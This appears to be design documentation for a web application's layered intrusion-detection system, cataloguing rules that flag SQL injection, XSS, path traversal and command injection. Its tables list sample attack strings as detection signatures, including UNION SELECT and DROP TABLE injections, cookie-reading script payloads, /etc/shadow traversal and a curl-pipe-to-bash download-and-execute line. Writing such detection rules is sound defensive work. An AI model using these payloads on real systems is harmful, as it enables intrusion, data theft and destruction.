# SentinelAI Security Architecture & Deterministic Rule Engine

**Unit**: Application Security and Intrusion Detection  
**Phase**: Phase 5 — Security Rule Engine  
**Module**: [`server/src/services/threatService.js`](file:///D:/Projects/SentinelAI/server/src/services/threatService.js)  
**Rule Catalog**: [`server/src/services/rules/`](file:///D:/Projects/SentinelAI/server/src/services/rules/)  

---

## 1. Defense-in-Depth Security Philosophy

SentinelAI enforces a multi-layered security architecture. AI is **never** treated as the sole line of defense; rather, it operates synergistically alongside deterministic controls:

```
        [ Incoming HTTP Request ]
                    │
                    ▼
┌───────────────────────────────────────┐
│ Layer 1: HTTP Hardening & Headers     │  (Helmet, Strict CORS, Size Bounds)
└───────────────────┬───────────────────┘
                    ▼
┌───────────────────────────────────────┐
│ Layer 2: Input Validation             │  (Schema constraints, Type enforcement)
└───────────────────┬───────────────────┘
                    ▼
┌───────────────────────────────────────┐
│ Layer 3: Rate Limiting                │  (IP & User burst prevention)
└───────────────────┬───────────────────┘
                    ▼
┌───────────────────────────────────────┐
│ Layer 4: Deterministic Rule Engine    │  (Instant high-confidence pattern matching)
└───────────────────┬───────────────────┘
                    ▼
┌───────────────────────────────────────┐
│ Layer 5: AI Payload Classifier        │  (NLP TF-IDF multi-class attack classification)
└───────────────────┬───────────────────┘
                    ▼
┌───────────────────────────────────────┐
│ Layer 6: Dynamic Risk Engine          │  (Multi-signal score 0–100 -> ALLOW/MONITOR/BLOCK)
└───────────────────────────────────────┘
```

---

## 2. Safety Guarantees & Safe Execution

> **Critical Application Security Requirement**:
> The security rule engine inspects indicators of attack. It **must never** execute or evaluate attacker-controlled input.

- **Zero Dynamic Evaluation**: No use of `eval()`, `Function()`, `vm`, or child process execution.
- **ReDoS Protection**: All string inputs are bounded to 50,000 characters prior to regex evaluation to mitigate catastrophic backtracking.
- **Obfuscation Unwrapping**: Safely performs URL decoding (`%27` -> `'`, `%3c` -> `<`) without side effects to prevent encoding-evasion bypasses.
- **Credential Hygiene**: Automatically excludes sensitive authentication fields (`password`, `passwordHash`, `token`, `secret`) from inspection logs.

---

## 3. Deterministic Rule Catalog

### 1. SQL Injection (`server/src/services/rules/sqlRules.js`)

| Rule ID | Severity | Description | Target Signature Example |
|---|---|---|---|
| `SQLI_TAUTOLOGY` | `HIGH` | Boolean tautology bypass | `' OR '1'='1`, `OR 1=1`, `AND 5=5` |
| `SQLI_UNION_SELECT` | `CRITICAL` | Second-order UNION data exfiltration | `UNION SELECT null, username FROM users` |
| `SQLI_COMMENT_SEQUENCE` | `MEDIUM` | Query termination comments | `--`, `/*...*/`, `#` |
| `SQLI_ADMIN_AUTH_BYPASS` | `HIGH` | Admin credential comment bypass | `admin' --`, `admin' #` |
| `SQLI_METADATA_PROBE` | `HIGH` | Database catalog enumeration | `information_schema`, `sys.tables` |
| `SQLI_TIME_DELAY` | `HIGH` | Blind time-based extraction probe | `SLEEP(5)`, `WAITFOR DELAY '0:0:5'` |
| `SQLI_DESTRUCTIVE_STACK` | `CRITICAL` | Stacked destructive statements | `; DROP TABLE users;` |

---

### 2. Cross-Site Scripting (`server/src/services/rules/xssRules.js`)

| Rule ID | Severity | Description | Target Signature Example |
|---|---|---|---|
| `XSS_SCRIPT_TAG` | `CRITICAL` | Executable HTML `<script>` block | `<script>alert(1)</script>` |
| `XSS_EVENT_HANDLER` | `HIGH` | Inline attribute execution hook | `<img src=x onerror=alert(1)>` |
| `XSS_JAVASCRIPT_URI` | `HIGH` | Pseudo-protocol URI scheme | `javascript:alert(document.cookie)` |
| `XSS_DANGEROUS_TAG` | `HIGH` | High-risk HTML container tag | `<iframe>`, `<object>`, `<svg onload=...>` |
| `XSS_DOM_EXFILTRATION` | `HIGH` | DOM session / token exfiltration | `document.cookie`, `window.location` |
| `XSS_DYNAMIC_EVAL` | `CRITICAL` | Dynamic string evaluation primitive | `eval('...')`, `setTimeout('...', 0)` |

---

### 3. Path Traversal & LFI (`server/src/services/rules/pathTraversalRules.js`)

| Rule ID | Severity | Description | Target Signature Example |
|---|---|---|---|
| `TRAVERSAL_DOT_DOT_SLASH` | `HIGH` | Directory boundary escape sequence | `../../../../`, `..\\..\\` |
| `TRAVERSAL_ENCODED_SLASH` | `HIGH` | URL-encoded traversal escape | `..%2f..%2fwin.ini` |
| `TRAVERSAL_UNIX_SENSITIVE_FILE` | `CRITICAL` | Direct Unix system file target | `/etc/passwd`, `/etc/shadow` |
| `TRAVERSAL_WINDOWS_SENSITIVE_FILE` | `CRITICAL` | Direct Windows configuration target | `win.ini`, `system32\drivers\etc\hosts` |
| `TRAVERSAL_NULL_BYTE` | `HIGH` | File extension poison null byte | `filename.pdf%00.php` |
| `TRAVERSAL_FILE_PROTOCOL` | `HIGH` | Arbitrary local file wrapper URI | `file:///etc/passwd` |

---

### 4. Command Injection (`server/src/services/rules/commandInjectionRules.js`)

| Rule ID | Severity | Description | Target Signature Example |
|---|---|---|---|
| `CMDI_OPERATOR_WITH_COMMAND` | `CRITICAL` | Operator chained to shell command | `| whoami`, `; cat file`, `&& dir` |
| `CMDI_SUB_SHELL_EXECUTION` | `CRITICAL` | Subshell evaluation substitution | `$(id)`, `` `whoami` `` |
| `CMDI_DIRECTORY_ENUMERATION` | `HIGH` | Windows directory enumeration command | `+|+dir c:\` |
| `CMDI_DOWNLOAD_AND_EXECUTE` | `CRITICAL` | Remote script pipe into shell | `curl http://site/sh \| bash` |
| `CMDI_RECONNAISSANCE_COMMAND` | `HIGH` | System reconnaissance utility | `whoami`, `net user`, `ifconfig` |

---

## 4. Rule Engine Output Format

```json
{
  "hasMatches": true,
  "ruleMatches": [
    "SQLI_TAUTOLOGY",
    "SQLI_COMMENT_SEQUENCE"
  ],
  "ruleSeverity": "HIGH",
  "ruleCategory": "SQL_INJECTION",
  "categories": [
    "SQL_INJECTION"
  ],
  "details": [
    {
      "id": "SQLI_TAUTOLOGY",
      "category": "SQL_INJECTION",
      "severity": "HIGH",
      "description": "Tautology boolean bypass expression (e.g. OR 1=1)"
    }
  ]
}
```